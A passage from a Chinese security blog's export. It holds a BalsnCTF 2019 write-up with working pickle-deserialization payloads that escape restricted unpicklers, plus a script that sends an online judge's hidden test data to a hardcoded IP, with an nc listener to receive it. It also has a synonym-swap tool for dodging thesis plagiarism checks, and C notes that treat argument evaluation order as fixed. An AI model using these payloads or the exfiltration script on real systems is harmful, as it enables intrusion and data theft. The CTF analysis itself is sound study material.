&quot;settings&quot; in objdir:        print(way)        return result+way+&quot;\n&quot;    return result</code></pre><p>这次是真的易得了:),至此结束</p><h3 id="BalsnCTF-2019-Pyshv1"><a href="#BalsnCTF-2019-Pyshv1" class="headerlink" title="BalsnCTF 2019 Pyshv1"></a>BalsnCTF 2019 Pyshv1</h3><pre><code class="python">#!/usr/bin/python3 -uimport securePickle as pickleimport codecspickle.whitelist.append(&#39;sys&#39;)class Pysh(object):    def __init__(self):        self.login()        self.cmds = {}    def login(self):        user = input().encode(&#39;ascii&#39;)        user = codecs.decode(user, &#39;base64&#39;)        user = pickle.loads(user)        raise NotImplementedError(&quot;Not Implemented QAQ&quot;)    def run(self):        while True:            req = input(&#39;$ &#39;)            func = self.cmds.get(req, None)            if func is None:                print(&#39;pysh: &#39; + req + &#39;: command not found&#39;)            else:                func()if __name__ == &#39;__main__&#39;:    pysh = Pysh()    pysh.run()</code></pre><pre><code class="python">import pickleimport iowhitelist = []# See https://docs.python.org/3.7/library/pickle.html#restricting-globalsclass RestrictedUnpickler(pickle.Unpickler):    def find_class(self, module, name):        if module not in whitelist or &#39;.&#39; in name:            raise KeyError(&#39;The pickle is spoilt :(&#39;)        return pickle.Unpickler.find_class(self, module, name)def loads(s):    &quot;&quot;&quot;Helper function analogous to pickle.loads().&quot;&quot;&quot;    return RestrictedUnpickler(io.BytesIO(s)).load()dumps = pickle.dumps</code></pre><p>只允许sys里的属性,而且属性里不能有.</p><pre><code>[&#39;__displayhook__&#39;, &#39;__doc__&#39;, &#39;__excepthook__&#39;, &#39;__interactivehook__&#39;, &#39;__loader__&#39;, &#39;__name__&#39;, &#39;__package__&#39;, &#39;__spec__&#39;, &#39;__stderr__&#39;, &#39;__stdin__&#39;, &#39;__stdout__&#39;, &#39;_clear_type_cache&#39;, &#39;_current_frames&#39;, &#39;_debugmallocstats&#39;, &#39;_getframe&#39;, &#39;_git&#39;, &#39;_home&#39;, &#39;_xoptions&#39;, &#39;abiflags&#39;, &#39;api_version&#39;, &#39;argv&#39;, &#39;base_exec_prefix&#39;, &#39;base_prefix&#39;, &#39;builtin_module_names&#39;, &#39;byteorder&#39;, &#39;call_tracing&#39;, &#39;callstats&#39;, &#39;copyright&#39;, &#39;displayhook&#39;, &#39;dont_write_bytecode&#39;, &#39;exc_info&#39;, &#39;excepthook&#39;, &#39;exec_prefix&#39;, &#39;executable&#39;, &#39;exit&#39;, &#39;flags&#39;, &#39;float_info&#39;, &#39;float_repr_style&#39;, &#39;get_asyncgen_hooks&#39;, &#39;get_coroutine_wrapper&#39;, &#39;getallocatedblocks&#39;, &#39;getcheckinterval&#39;, &#39;getdefaultencoding&#39;, &#39;getdlopenflags&#39;, &#39;getfilesystemencodeerrors&#39;, &#39;getfilesystemencoding&#39;, &#39;getprofile&#39;, &#39;getrecursionlimit&#39;, &#39;getrefcount&#39;, &#39;getsizeof&#39;, &#39;getswitchinterval&#39;, &#39;gettrace&#39;, &#39;hash_info&#39;, &#39;hexversion&#39;, &#39;implementation&#39;, &#39;int_info&#39;, &#39;intern&#39;, &#39;is_finalizing&#39;, &#39;last_traceback&#39;, &#39;last_type&#39;, &#39;last_value&#39;, &#39;maxsize&#39;, &#39;maxunicode&#39;, &#39;meta_path&#39;, &#39;modules&#39;, &#39;path&#39;, &#39;path_hooks&#39;, &#39;path_importer_cache&#39;, &#39;platform&#39;, &#39;prefix&#39;, &#39;ps1&#39;, &#39;ps2&#39;, &#39;set_asyncgen_hooks&#39;, &#39;set_coroutine_wrapper&#39;, &#39;setcheckinterval&#39;, &#39;setdlopenflags&#39;, &#39;setprofile&#39;, &#39;setrecursionlimit&#39;, &#39;setswitchinterval&#39;, &#39;settrace&#39;, &#39;stderr&#39;, &#39;stdin&#39;, &#39;stdout&#39;, &#39;thread_info&#39;, &#39;version&#39;, &#39;version_info&#39;, &#39;warnoptions&#39;]</code></pre><p>发现有个modules,但是loads那里有一个死亡raise</p><p><code>sys._getframe</code> 可以返回带有exec的字典,但是好像没啥用</p><p>现在问题是不知道如何取出modules里的值</p><p>阅读文档发现</p><blockquote><p>This is a dictionary that maps module names to modules which have already been loaded. This can be manipulated to force reloading of modules and other tricks. However, replacing the dictionary will not necessarily work as expected and deleting essential items from the dictionary may cause Python to fail. </p></blockquote><p>可以修改modules来修改模块内容</p><pre><code class="shell">&gt;&gt;&gt; import sys&gt;&gt;&gt; sys.modules[&#39;sys&#39;]=sys.modules&gt;&gt;&gt; import sys&gt;&gt;&gt; dir(sys)[&#39;__class__&#39;, &#39;__contains__&#39;, &#39;__delattr__&#39;, &#39;__delitem__&#39;, &#39;__dir__&#39;, &#39;__doc__&#39;, &#39;__eq__&#39;, &#39;__format__&#39;, &#39;__ge__&#39;, &#39;__getattribute__&#39;, &#39;__getitem__&#39;, &#39;__gt__&#39;, &#39;__hash__&#39;, &#39;__init__&#39;, &#39;__init_subclass__&#39;, &#39;__iter__&#39;, &#39;__le__&#39;, &#39;__len__&#39;, &#39;__lt__&#39;, &#39;__ne__&#39;, &#39;__new__&#39;, &#39;__reduce__&#39;, &#39;__reduce_ex__&#39;, &#39;__repr__&#39;, &#39;__setattr__&#39;, &#39;__setitem__&#39;, &#39;__sizeof__&#39;, &#39;__str__&#39;, &#39;__subclasshook__&#39;, &#39;clear&#39;, &#39;copy&#39;, &#39;fromkeys&#39;, &#39;get&#39;, &#39;items&#39;, &#39;keys&#39;, &#39;pop&#39;, &#39;popitem&#39;, &#39;setdefault&#39;, &#39;update&#39;, &#39;values&#39;]</code></pre><p>然后sys就被替换成sys.modules了,就可以拿到os了</p><p>然后再对sys.modules[‘sys’]再赋值为os</p><p>就可以import os了</p><p>(师傅们tql)</p><p>构造payload</p><pre><code>csysmodulesS&#39;sys&#39;csysmodulesp100scsysget(S&#39;os&#39;tRp101g100S&#39;sys&#39;g101scsyssystem(S&#39;dir&#39;tR.</code></pre><h3 id="BalsnCTF-2019-Pyshv2"><a href="#BalsnCTF-2019-Pyshv2" class="headerlink" title="BalsnCTF 2019 Pyshv2"></a>BalsnCTF 2019 Pyshv2</h3><pre><code class="python">#!/usr/bin/python3 -uimport securePickle as pickleimport codecspickle.whitelist.append(&#39;structs&#39;)class Pysh(object):    def __init__(self):        self.login()        self.cmds = {            &#39;help&#39;: self.cmd_help,            &#39;flag&#39;: self.cmd_flag,        }    def login(self):        user = input().encode(&#39;ascii&#39;)        user = codecs.decode(user, &#39;base64&#39;)        user = pickle.loads(user)        raise NotImplementedError(&quot;Not Implemented QAQ&quot;)    def run(self):        while True:            req = input(&#39;$ &#39;)            func = self.cmds.get(req, None)            if func is None:                print(&#39;pysh: &#39; + req + &#39;: command not found&#39;)            else:                func()    def cmd_help(self):        print(&#39;Available commands: &#39; + &#39; &#39;.join(self.cmds.keys()))    def cmd_su(self):        print(&quot;Not Implemented QAQ&quot;)        # self.user.privileged = 1    def cmd_flag(self):        print(&quot;Not Implemented QAQ&quot;)if __name__ == &#39;__main__&#39;:    pysh = Pysh()    pysh.run()</code></pre><p>这次更骚了直接给了个空模块</p><pre><code class="shell">&gt;&gt;&gt; dir(structs)[&#39;__builtins__&#39;, &#39;__cached__&#39;, &#39;__doc__&#39;, &#39;__file__&#39;, &#39;__loader__&#39;, &#39;__name__&#39;, &#39;__package__&#39;, &#39;__spec__&#39;]</code></pre><p><code>__spec__,__loader__,__builtins__</code>是我们需要注意的</p><p>我们看一下操作码c(看重载后的find_class代码,看别人wp的时候没看重载后的find_class,然后连wp都看不懂了)的实现,发现调用了<code>__import__</code></p><p>在文档中发现</p><blockquote><p>此函数(<code>__import__</code>)会由 <a href="https://docs.python.org/zh-cn/3/reference/simple_stmts.html#import" target="_blank" rel="noopener"><code>import</code></a> 语句发起调用。 它可以被替换 (通过导入 <a href="https://docs.python.org/zh-cn/3/library/builtins.html#module-builtins" target="_blank" rel="noopener"><code>builtins</code></a> 模块并赋值给 <code>builtins.__import__</code>) 以便修改 <code>import</code> 语句的语义 </p></blockquote><p>而<code>__buiutins__</code>里面也有<code>__import__</code></p><pre><code>&gt;&gt;&gt; structs.__builtins__[&#39;__import__&#39;]=eval&gt;&gt;&gt; import osTraceback (most recent call last):  File &quot;&lt;stdin&gt;&quot;, line 1, in &lt;module&gt;TypeError: eval expected at most 3 arguments, got 5&gt;&gt;&gt; __import__(&#39;print(123)&#39;)123</code></pre><p>成功修改了<code>__import__</code></p><p>我们再看重载的find_class</p><p>securePickle.py</p><pre><code class="python">class RestrictedUnpickler(pickle.Unpickler):    def find_class(self, module, name):        if module not in whitelist or &#39;.&#39; in name:            raise KeyError(&#39;The pickle is spoilt :(&#39;)        module = __import__(module)        return getattr(module, name)#一般重载都会改成if xxxx : raise xxxx else:  return pickle.Unpickler.find_class(self, module, name)</code></pre><p>而原来的find_class是这样的</p><pre><code class="python">def find_class:    __import__(module, level=0)    return getattr(sys.modules[module], name)</code></pre><p>接着我们可以通过操作码c来实现一下操作</p><pre><code class="python">return getattr(__import__(module), name)</code></pre><p>如果能令<code>__import__(module)</code>的返回值为<code>__builtins__</code>时,就可以取出<code>__builtins__</code>里的值</p><p>结合<a href="https://pyzh.readthedocs.io/en/latest/python-magic-methods-guide.html#id1" target="_blank" rel="noopener">魔术方法</a><code>__getattribute__</code>便可以实现</p><p>于是构造</p><pre><code class="python">bis=structs.__builtins__structs.__setattr__(&#39;structs&#39;,bis)#name只能为structsbis[&#39;__import__&#39;]=structs.__getattribute__getattr(__import__(&quot;structs&quot;),&quot;get&quot;)(&quot;eval&quot;)(&quot;print(123)&quot;)</code></pre><p>对应的pickle代码</p><pre><code>cstructs__builtins__p1000cstructs__setattr__(S&#39;structs&#39;g100tRg100S&#39;__import__&#39;cstructs__getattribute__scstructsget(S&quot;eval&quot;tR(S&#39;print(123)&#39;tR.</code></pre><h3 id="BalsnCTF-2019-Pyshv3"><a href="#BalsnCTF-2019-Pyshv3" class="headerlink" title="BalsnCTF 2019 Pyshv3"></a>BalsnCTF 2019 Pyshv3</h3><p>structs.py</p><pre><code class="python">class User(object):    def __init__(self, name, group):        self.name = name        self.group = group        self.isadmin = 0        self.prompt = &#39;&#39;</code></pre><pre><code class="python">import pickleimport iowhitelist = []# See https://docs.python.org/3.7/library/pickle.html#restricting-globalsclass RestrictedUnpickler(pickle.Unpickler):    def find_class(self, module, name):        if module not in whitelist or &#39;.&#39; in name:            raise KeyError(&#39;The pickle is spoilt :(&#39;)        return pickle.Unpickler.find_class(self, module, name)def loads(s):    &quot;&quot;&quot;Helper function analogous to pickle.loads().&quot;&quot;&quot;    return RestrictedUnpickler(io.BytesIO(s)).load()dumps = pickle.dumps</code></pre><p>server.py</p><pre><code class="python">import securePickle as pickleimport codecsimport ospickle.whitelist.append(&#39;structs&#39;)class Pysh(object):    def __init__(self):        self.key = os.urandom(100)        self.login()        self.cmds = {            &#39;help&#39;: self.cmd_help,            &#39;whoami&#39;: self.cmd_whoami,            &#39;su&#39;: self.cmd_su,            &#39;flag&#39;: self.cmd_flag,        }    def login(self):        with open(&#39;../flag.txt&#39;, &#39;rb&#39;) as f:            flag = f.read()        flag = bytes(a ^ b for a, b in zip(self.key, flag))        user = input().encode(&#39;ascii&#39;)        user = codecs.decode(user, &#39;base64&#39;)        user = pickle.loads(user)        print(&#39;Login as &#39; + user.name + &#39; - &#39; + user.group)        user.privileged = False        user.flag = flag        self.user = user    def run(self):        while True:            req = input(&#39;$ &#39;)            func = self.cmds.get(req, None)            if func is None:                print(&#39;pysh: &#39; + req + &#39;: command not found&#39;)            else:                func()    def cmd_help(self):        print(&#39;Available commands: &#39; + &#39; &#39;.join(self.cmds.keys()))    def cmd_whoami(self):        print(self.user.name, self.user.group)    def cmd_su(self):        print(&quot;Not Implemented QAQ&quot;)        # self.user.privileged = 1    def cmd_flag(self):        if not self.user.privileged:            print(&#39;flag: Permission denied&#39;)        else:            print(bytes(a ^ b for a, b in zip(self.user.flag, self.key)))if __name__ == &#39;__main__&#39;:    pysh = Pysh()    pysh.run()</code></pre><p>如果我们想拿到flag,要么命令执行直接拿flag要么就令<code>user.privileged=True</code> 调用cmd_flag来拿flag</p><p>但是再反序列化处</p><pre><code class="python">        user = pickle.loads(user)        print(&#39;Login as &#39; + user.name + &#39; - &#39; + user.group)        user.privileged = False</code></pre><p><code>user.privileged</code>会被覆盖为False,再康康其他的信息把</p><p><code>dir(structs)</code>:</p><pre><code class="python">[&#39;User&#39;, &#39;__builtins__&#39;, &#39;__cached__&#39;, &#39;__doc__&#39;, &#39;__file__&#39;, &#39;__loader__&#39;, &#39;__name__&#39;, &#39;__package__&#39;, &#39;__spec__&#39;]</code></pre><hr><p>几个小时后,看wp学成归来.</p><p>我:艹,太骚了,师傅们牛逼死了</p><hr><p>之前说有两个解题思路,命令执行这一个思路在看了一会之后就觉得不太行,毫无头绪</p><p>再康康让<code>user.privileged=False</code>失效这一思路,emmmm感觉也不太行.</p><p>但是,类的赋值肯定会受到一些特殊函数的影响</p><p>在研究类的赋值的时候可以找到<a href="https://foofish.net/what-is-descriptor-in-python.html" target="_blank" rel="noopener">描述符</a>可以自定义赋值函数</p><p>那么如果我们能让User的<code>__set__</code>变成一个接受3个参数的函数,就可以令<code>user.privileged=False</code>无效</p><p>但是很显然pickle里是无法直接编写代码的,令<code>__set__=&quot;&quot;</code>?更不行,会直接报错</p><p>继续阅读代码我们会发现一个神奇的东西</p><pre><code class="python">class User(object):    def __init__(self, name, group):        self.name = name        self.group = group        self.isadmin = 0        self.prompt = &#39;&#39;        print(&quot;name:%s ,group:%s&quot;%(name,group))</code></pre><p><code>User.__init__</code>刚好接受三个参数</p><p>我们能不能让<code>__set__=User</code>?,然后调用<code>__set__</code>的时候调用<code>User.__init__</code></p><pre><code class="python">&gt;&gt;&gt; setattr(User,&#39;test&#39;,User(123,123))name:123 ,group:123&gt;&gt;&gt; setattr(User,&quot;__set__&quot;,User)&gt;&gt;&gt; b=User(123,123)name:123 ,group:123&gt;&gt;&gt; b.test=123123name:&lt;structs.User object at 0x0000017BA1538748&gt; ,group:123123</code></pre><p>于是构造:</p><pre><code class="python">a=__import__(&quot;structs&quot;).Userb=User(&quot;123&quot;,&quot;456&quot;)setattr(a,&quot;privileged&quot;,b)setattr(a,&quot;__set__&quot;,a)return b</code></pre><p>对应的pickle代码为</p><pre><code>cstructsUserp100(S&quot;123&quot;S&quot;456&quot;tRp101g100(N}S&#39;privileged&#39;g101sS&#39;__set__&#39;g100stbg101.</code></pre><pre><code>$ helpAvailable commands: help whoami su flag$ whoami123 456$ flagb&#39;Balsn{pY7h0n1dae_ObJ3c7}\n&#39;</code></pre><p>hhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhh</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p> <a href="https://media.blackhat.com/bh-us-11/Slaviero/BH_US_11_Slaviero_Sour_Pickles_Slides.pdf" target="_blank" rel="noopener">https://media.blackhat.com/bh-us-11/Slaviero/BH_US_11_Slaviero_Sour_Pickles_Slides.pdf</a> </p><p><a href="https://www.anquanke.com/post/id/188981" target="_blank" rel="noopener">https://www.anquanke.com/post/id/188981</a> </p><p> <a href="http://www.polaris-lab.com/index.php/archives/178/" target="_blank" rel="noopener">http://www.polaris-lab.com/index.php/archives/178/</a> </p><p> <a href="https://www.leavesongs.com/PENETRATION/code-breaking-2018-python-sandbox.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/code-breaking-2018-python-sandbox.html</a> </p><p> <a href="https://xz.aliyun.com/t/5306" target="_blank" rel="noopener">https://xz.aliyun.com/t/5306</a> </p><p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="https://explorersss.github.io/2019/12/16/pickle/">https://explorersss.github.io/2019/12/16/pickle/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> python </tag>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>勉强能用的论文降重</title>
      <link href="/2019/12/15/%E5%8B%89%E5%BC%BA%E8%83%BD%E7%94%A8%E7%9A%84%E8%AE%BA%E6%96%87%E9%99%8D%E9%87%8D/"/>
      <url>/2019/12/15/%E5%8B%89%E5%BC%BA%E8%83%BD%E7%94%A8%E7%9A%84%E8%AE%BA%E6%96%87%E9%99%8D%E9%87%8D/</url>
      
        <content type="html"><![CDATA[<h1 id="勉强能用的论文降重"><a href="#勉强能用的论文降重" class="headerlink" title="勉强能用的论文降重"></a>勉强能用的论文降重</h1><pre><code class="python">import sysif len(sys.argv) !=2:    print(&quot;Usage: %s inputfile outputfile&quot; % sys.argv[0])    exit()import synonymsf=sys.argv[1]s=&quot;&quot;with open(f,&quot;r&quot;) as fl:    s=fl.read()resstr,stype=synonyms.seg(s)with open(sys.argv[2],&quot;w&quot;) as fw:    for i in resstr:        if len(i)==1:            fw.write(i)        else :            nearbystr,num=synonyms.nearby(i)            if len(nearbystr)&gt;1 and num[1]&gt; 0.75:                print(nearbystr[1],num[1])                fw.write(nearbystr[1])            else :                fw.write(i)</code></pre><p>可以调整<code>if len(nearbystr)&gt;1 and num[1]&gt; 0.75:</code>来修改近义词的准确率.</p><p>用完之后一定要自己校对一遍!!!不然…..</p><p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="https://explorersss.github.io/2019/12/15/勉强能用的论文降重/">https://explorersss.github.io/2019/12/15/勉强能用的论文降重/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>]]></content>
      
      
      <categories>
          
          <category> 杂 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 小工具 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>在线oj获取数据</title>
      <link href="/2019/12/15/%E5%9C%A8%E7%BA%BFoj%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE/"/>
      <url>/2019/12/15/%E5%9C%A8%E7%BA%BFoj%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE/</url>
      
        <content type="html"><![CDATA[<h1 id="在线oj获取数据"><a href="#在线oj获取数据" class="headerlink" title="在线oj获取数据"></a>在线oj获取数据</h1><p>python3:</p><pre><code class="python">import socketimport sys    ip = &#39;39.108.164.219&#39;port = 60000def send_raw(raw):    try:        with socket.create_connection((ip, port), timeout=10) as conn:            conn.send(bytes(raw,encoding=&quot;ascii&quot;))            conn.close()    except:        return False      return Truedata=&quot;&quot;for line in sys.stdin:    data+=linesend_raw(data)</code></pre><p>vps上运行</p><pre><code class="shell">#!/bin/bashi=1while [ $i -eq 1 ]do      nc -FNlp 60000  &gt;&gt; /tmp/data    echo -e  &quot;\n---------------------------------\n&quot; &gt;&gt; /tmp/datadone</code></pre><p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="https://explorersss.github.io/2019/12/15/在线oj获取数据/">https://explorersss.github.io/2019/12/15/在线oj获取数据/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>]]></content>
      
      
      <categories>
          
          <category> 杂 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 小工具 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>由cout和printf来对函数传参过程的探讨</title>
      <link href="/2019/12/14/%E7%94%B1cout%E5%92%8Cprintf%E6%9D%A5%E5%AF%B9%E5%87%BD%E6%95%B0%E4%BC%A0%E5%8F%82%E8%BF%87%E7%A8%8B%E7%9A%84%E6%8E%A2%E8%AE%A8/"/>
      <url>/2019/12/14/%E7%94%B1cout%E5%92%8Cprintf%E6%9D%A5%E5%AF%B9%E5%87%BD%E6%95%B0%E4%BC%A0%E5%8F%82%E8%BF%87%E7%A8%8B%E7%9A%84%E6%8E%A2%E8%AE%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="由cout和printf来对函数传参过程的探讨"><a href="#由cout和printf来对函数传参过程的探讨" class="headerlink" title="由cout和printf来对函数传参过程的探讨"></a>由cout和printf来对函数传参过程的探讨</h1><h2 id="令人疑惑的结果"><a href="#令人疑惑的结果" class="headerlink" title="令人疑惑的结果"></a>令人疑惑的结果</h2><p>来看一个代码吧</p><pre><code class="c++">#include&lt;stdio.h&gt;int i=0;int update(){i++;return i;}int main(){    printf(&quot;update():%d i:%d\n&quot;,update(),i);    return 0;}</code></pre><p>你觉得它的输出结果是什么<br><del>update():1 i:1</del> ?<br><strong>错</strong>，正确输出是<code>update():1 i:0</code></p><h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><p>为何会如此,先来做个实验康康吧:</p><pre><code class="c++">#include&lt;iostream&gt;#include &lt;queue&gt;#include&lt;stdio.h&gt; using namespace std;int i=0;int update(){i++;return i;};int main(){    printf(&quot;----------------------------test printf----------------------------\n&quot;);    printf(&quot;before:%d\n&quot;,i);    printf(&quot;update():%d i:%d\n&quot;,update(),i);    printf(&quot;later:%d\n&quot;,i);    printf(&quot;before:%d\n&quot;,i);    printf(&quot;i:%d update():%d \n&quot;,i,update());    printf(&quot;later:%d\n&quot;,i);    printf(&quot;update1:%d update2:%d update3:%d&quot;,update(),update(),update());}</code></pre><p>它的输出结果是</p><pre><code>----------------------------test printf----------------------------before:0update():1 i:0later:1before:1i:2 update():2later:2update1:5 update2:4 update3:3</code></pre><p>只有printf是这样的?不，可变参数的打印函数都具有这样的特性<br>我们来测试一下cout来验证一下</p><pre><code class="c++">#include&lt;iostream&gt;#include &lt;queue&gt;#include&lt;stdio.h&gt; using namespace std;int i=0;int update(){i++;return i;};int main(){    cout&lt;&lt;&quot;---------------------------- test cout ----------------------------\n&quot;;    i=0;    cout&lt;&lt;&quot;before:&quot;&lt;&lt;i&lt;&lt;endl;    cout&lt;&lt;&quot;update():&quot;&lt;&lt;update()&lt;&lt;&quot; i:&quot;&lt;&lt;i&lt;&lt;endl;    cout&lt;&lt;&quot;later:&quot;&lt;&lt;i&lt;&lt;endl;    cout&lt;&lt;&quot;before:&quot;&lt;&lt;i&lt;&lt;endl;    cout&lt;&lt;&quot;i:&quot;&lt;&lt;i&lt;&lt;&quot; update():&quot;&lt;&lt;update()&lt;&lt;endl;    cout&lt;&lt;&quot;later:&quot;&lt;&lt;i&lt;&lt;endl;    cout&lt;&lt;&quot;update1:&quot;&lt;&lt;update()&lt;&lt;&quot; update2:&quot;&lt;&lt;update()&lt;&lt;&quot; update3:&quot;&lt;&lt;update()&lt;&lt;endl;}</code></pre><p>它的输出结果是:</p><pre><code>---------------------------- test cout ----------------------------before:0update():1 i:0later:1before:1i:2 update():2later:2update1:5 update2:4 update3:3</code></pre><h2 id="汇编层面的解释"><a href="#汇编层面的解释" class="headerlink" title="汇编层面的解释"></a>汇编层面的解释</h2><p>为什么会这样,这就必须说起c和c++中关于函数传参的过程了:</p><p>在汇编中函数传参要从最后一个参数到第一个参数分别入栈，这样函数取参数的时候，pop出来的顺序才是1-n。</p><p>因此,在<code>printf(&quot;update():%d i:%d\n&quot;,update(),i);</code>中,函数先压入i,再执行update(),将其返回值压入栈。</p><p>以上只是理论，真实的环境中由x86,x64,32位,16位机,它们的具体的传参方式略有不同:)  </p><p>我们来看一下x64下这一条语句的汇编代码</p><pre><code>mov     ebx, cs:icall    _Z6updatev      ; update(void)mov     r8d, ebxmov     edx, eaxlea     rcx, aUpdateDID ; &quot;update():%d i:%d\n&quot;call    _ZL6printfPKcz  ; printf(char const*,...)</code></pre><p>在X64下,是寄存器传参. 前4个参数分别是 rcx rdx r8 r9进行传参.多余的通过栈传参.从右向左入栈。</p><p>上述代码中 格式化字符串在rcx中(最后一个赋值),update()返回值在edx,中第二个赋值。i在r8中第一个赋值 。</p><p>但是我们可以看到<code>mov     ebx, cs:i</code>程序先将i的值移动到ebx中，再调用update函数,将返回值所在寄存器eax移动到edx中。</p><p>虽然过程有点变化,但是最后的结果还是和在汇编中函数传参要从最后一个参数到第一个参数分别入栈。</p><h2 id="来练习一下吧"><a href="#来练习一下吧" class="headerlink" title="来练习一下吧"></a>来练习一下吧</h2><p>最后上一个题目吧//</p><pre><code class="c++">#include &lt;stdio.h&gt;int main(){    long long a = 1, b = 2, c = 3;    printf(&quot;%d %d %d\n&quot;, a,b,c);    return 0;}</code></pre><p>求输出</p><p><a href="https://blog.csdn.net/u014713819/article/details/29355455" target="_blank" rel="noopener">答案和解析</a></p><p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="https://explorersss.github.io/2019/12/14/由cout和printf来对函数传参过程的探讨/">https://explorersss.github.io/2019/12/14/由cout和printf来对函数传参过程的探讨/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>]]></content>
      
      
      <categories>
          
          <category> 编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 编程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hello-world</title>
      <link href="/2019/12/14/hello-world/"/>
      <url>/2019/12/14/hello-world/</url>
      
        <content type="html"><![CDATA[<h2 id="title-Hello-World"><a href="#title-Hello-World" class="headerlink" title="title: Hello World"></a>title: Hello World</h2><p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><pre><code class="bash">$ hexo new &quot;My New Post&quot;</code></pre><p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><pre><code class="bash">$ hexo server</code></pre><p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><pre><code class="bash">$ hexo generate</code></pre><p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><pre><code class="bash">$ hexo deploy</code></pre><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html" target="_blank" rel="noopener">Deployment</a></p><p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="https://explorersss.github.io/2019/12/14/hello-world/">https://explorersss.github.io/2019/12/14/hello-world/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>]]></content>
      
      
      
        <tags>
            
            <tag> 杂 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
